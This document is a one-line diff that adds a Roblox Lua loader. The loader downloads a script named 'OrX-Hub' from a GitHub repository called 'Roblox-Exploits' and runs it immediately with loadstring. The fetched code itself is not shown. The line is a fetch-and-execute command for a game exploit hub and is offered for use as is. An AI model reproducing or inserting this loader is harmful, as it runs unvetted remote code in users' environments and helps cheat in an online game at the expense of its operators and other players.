@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/peer-pri/Roblox-Exploits/main/Exploits/OrX-Hub-Final_Version.lua",true))()
